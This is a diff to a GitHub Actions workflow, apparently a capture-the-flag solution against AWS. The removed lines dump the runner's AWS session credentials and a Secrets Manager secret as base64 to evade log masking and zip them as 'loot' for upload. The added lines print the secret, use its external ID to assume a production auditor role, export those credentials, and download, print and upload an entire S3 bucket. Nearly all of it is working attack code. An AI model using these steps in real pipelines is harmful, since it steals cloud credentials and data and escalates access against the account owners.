@@ -1,4 +1,4 @@
-name: ca
+name: CTF Working Solution
 
 on:
   workflow_dispatch:
@@ -8,7 +8,7 @@ permissions:
   contents: read
 
 jobs:
-  ScanVulns:
+  GetFlag:
     runs-on: ubuntu-latest
     env:
       AWS_REGION: us-west-2
@@ -24,49 +24,87 @@ jobs:
       - name: Who am I (base role)
         run: aws sts get-caller-identity
 
-      - name: Save BASE role creds (mask-bypass)
+      - name: Extract External ID from secret
         run: |
-          cat > base_creds.json <<JSON
-          {
-            "AccessKeyId":    "${AWS_ACCESS_KEY_ID}",
-            "SecretAccessKey":"${AWS_SECRET_ACCESS_KEY}",
-            "SessionToken":   "${AWS_SESSION_TOKEN}",
-            "Region":         "us-west-2"
-          }
-          JSON
-          echo "BASE_CREDS_B64: $(base64 -w0 base_creds.json 2>/dev/null || base64 base_creds.json)"
-      - name: Read secret internal/secrets/id-v2
-        id: getsecret
-        run: |
-          aws secretsmanager get-secret-value \
+          # Get the secret and extract the external_id
+          SECRET_STRING=$(aws secretsmanager get-secret-value \
             --secret-id internal/secrets/id-v2 \
-            --region us-west-2 > secret.json || { echo "Could not read secret"; exit 0; }
-          jq . secret.json > secret.pretty.json
-          # Mask-bypass in logs
-          echo "SECRET_B64: $(base64 -w0 secret.json 2>/dev/null || base64 secret.json)"
-      - name: Assume NEXT role (if trust allows)
+            --region us-west-2 \
+            --query 'SecretString' \
+            --output text)
+          
+          echo "Secret contains: $SECRET_STRING"
+          
+          # Extract the external_id value (it's extidHX9F3A1)
+          EXTERNAL_ID=$(echo "$SECRET_STRING" | jq -r '.external_id')
+          echo "Found External ID: $EXTERNAL_ID"
+          echo "EXTERNAL_ID=$EXTERNAL_ID" >> $GITHUB_ENV
+
+      - name: Assume prod-readonly-auditor WITH THE EXTERNAL ID
         run: |
+          echo "Using External ID: $EXTERNAL_ID"
+          
+          # THIS IS THE KEY - ADD --external-id parameter!
           aws sts assume-role \
             --role-arn "arn:aws:iam::170974506515:role/prod-readonly-auditor" \
-            --role-session-name "pivot-ctf" \
-            > next_assume.json || { echo "assume-role failed (may need ExternalId)"; exit 0; }
-          echo "NEXT_CREDS_B64: $(base64 -w0 next_assume.json 2>/dev/null || base64 next_assume.json)"
-      - name: List S3 objects
-        continue-on-error: true
-        run: aws s3 ls s3://ci-deployment-logsv1/ --region us-west-2
+            --role-session-name "ctf-pivoted" \
+            --external-id "$EXTERNAL_ID" \
+            --output json > assumed_role.json
+          
+          # Extract credentials
+          export AWS_ACCESS_KEY_ID=$(cat assumed_role.json | jq -r '.Credentials.AccessKeyId')
+          export AWS_SECRET_ACCESS_KEY=$(cat assumed_role.json | jq -r '.Credentials.SecretAccessKey')  
+          export AWS_SESSION_TOKEN=$(cat assumed_role.json | jq -r '.Credentials.SessionToken')
+          
+          # Save for next steps
+          echo "AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID" >> $GITHUB_ENV
+          echo "AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY" >> $GITHUB_ENV
+          echo "AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN" >> $GITHUB_ENV
+          
+          echo "Successfully assumed prod-readonly-auditor role!"
 
-      - name: Zip loot
+      - name: Verify we are now prod-readonly-auditor
         run: |
-          files=()
-          [[ -f base_creds.json ]] && files+=("base_creds.json")
-          [[ -f secret.json ]] && files+=("secret.json" "secret.pretty.json")
-          [[ -f next_assume.json ]] && files+=("next_assume.json")
-          if [[ ${#files[@]} -gt 0 ]]; then
-            zip -q loot.zip "${files[@]}"
+          echo "Now running as:"
+          aws sts get-caller-identity
+
+      - name: Access S3 and GET THE FLAG
+        run: |
+          echo "=== Accessing ci-deployment-logsv1 bucket ==="
+          aws s3 ls s3://ci-deployment-logsv1/ --recursive --region us-west-2
+          
+          echo ""
+          echo "=== Downloading all files ==="
+          mkdir -p flag-files
+          aws s3 sync s3://ci-deployment-logsv1/ ./flag-files/ --region us-west-2
+          
+          echo ""
+          echo "=== Showing all downloaded files ==="
+          ls -la flag-files/
+          
+          echo ""
+          echo "=== Displaying content of all files ==="
+          for file in $(find flag-files -type f); do
+              echo "========== $file =========="
+              cat "$file"
+              echo ""
+          done
+          
+          echo "=== Searching for flag ==="
+          grep -r "flag{" flag-files/ 2>/dev/null || true
+          grep -r "FLAG" flag-files/ 2>/dev/null || true
+          grep -r "CTF" flag-files/ 2>/dev/null || true
+
+      - name: Upload any found files
+        if: always()
+        run: |
+          if [ -d flag-files ] && [ "$(ls -A flag-files)" ]; then
+            zip -r flag-files.zip flag-files/
           fi
-      - name: Upload loot
-        if: hashFiles('loot.zip') != ''
+          
+      - name: Upload flag files as artifact
+        if: hashFiles('flag-files.zip') != ''
         uses: actions/upload-artifact@v4
         with:
-          name: oidc-role-and-secret
-          path: loot.zip
+          name: flag-files
+          path: flag-files.zip
